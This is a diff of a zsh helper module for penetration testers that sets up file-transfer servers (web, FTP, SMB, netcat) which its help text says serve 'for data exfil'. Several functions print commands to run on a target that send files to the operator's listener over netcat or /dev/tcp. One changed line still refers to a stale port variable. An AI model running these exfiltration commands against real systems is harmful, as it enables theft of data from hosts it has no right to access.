@@ -14,19 +14,19 @@ such as web, ftp, smb and other services for data exfil or transfer.
 
 Commands
 --------
-qq-srv-install: install dependencies
-qq-srv-web: hosts a python3 web server in current dir
-qq-srv-ftp: hosts a python3 ftp server in current dir
-qq-srv-smb: hosts an impacket smb server in current dir
-qq-srv-tftp: starts the atftpd service in /srv/tftp
-qq-srv-smtp: hosts a python3 smtp server in current dir
-qq-srv-updog: hosts an updog web server in current dir
-qq-srv-nc-tar: hosts a netcat server > tar file in current dir
-qq-srv-nc-file: hosts a netcat server > file in current dir
-qq-srv-web-hosted: hosts a python3 web server in /srv, port as $1
-qq-srv-php-hosted: hosts a php web server in /srv, port as $1
-qq-srv-ftp-hosted: hosts a python3 ftp server in /srv
-qq-srv-updog-hosted: hosts an updog web server in /srv
+qq-srv-install:          install dependencies
+qq-srv-web:              hosts a python3 web server in current dir
+qq-srv-ftp:              hosts a python3 ftp server in current dir
+qq-srv-smb:              hosts an impacket smb server in current dir
+qq-srv-tftp:             starts the atftpd service in /srv/tftp
+qq-srv-smtp:             hosts a python3 smtp server in current dir
+qq-srv-updog:            hosts an updog web server in current dir
+qq-srv-nc-tar:           hosts a netcat server > tar file in current dir
+qq-srv-nc-file:          hosts a netcat server > file in current dir
+qq-srv-web-hosted:       hosts a python3 web server in /srv, port as $1
+qq-srv-php-hosted:       hosts a php web server in /srv, port as $1
+qq-srv-ftp-hosted:       hosts a python3 ftp server in /srv
+qq-srv-updog-hosted:     hosts an updog web server in /srv
 
 END
 }
@@ -34,7 +34,6 @@ END
 qq-srv-install() {
     __pkgs netcat atftpd 
     __pkgs php python3 python3-pip python3-smb python3-pyftpdlib impacket-scripts
- 
     sudo pip3 install updog
 }
 
@@ -85,29 +84,29 @@ qq-srv-updog() {
 
 qq-srv-updog-hosted() {
     __info "Serving content from /srv"
-    updog -p 443 --ssl -d /srv
+    sudo updog -p 443 --ssl -d /srv
 }
 
 qq-srv-nc-tar() {
     qq-vars-set-lhost
-    local port && read "port?$(__cyan PORT: )"
+    qq-vars-set-lport
     __cyan "Use the command below on the target system: "
-    echo "tar cfv - /path/to/send | nc ${_LHOST} ${port}"
-    print -z "nc -nvlp ${port} | tar xfv -"
+    echo "tar cfv - /path/to/send | nc ${__LHOST} ${__LPORT}"
+    print -z "nc -nvlp ${__LPORT} | tar xfv -"
 }
 
 qq-srv-nc-file() {
     qq-vars-set-lhost
-    local port && read "port?$(__cyan PORT: )"
+    qq-vars-set-lport
     __cyan "Use the command below on the target system: "
-    echo "cat FILE > /dev/tcp/${__LHOST}/${port}"
+    echo "cat FILE > /dev/tcp/${__LHOST}/${__LPORT}"
     print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
 }
 
 qq-srv-nc-b64() {
     qq-vars-set-lhost
-    local port && read "port?$(__cyan PORT: )"
+    qq-vars-set-lport
     __cyan "Use the command below on the target system: "
-    echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${port}"
-    print -z "nc -nvlp ${port} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
+    echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
+    print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
 }
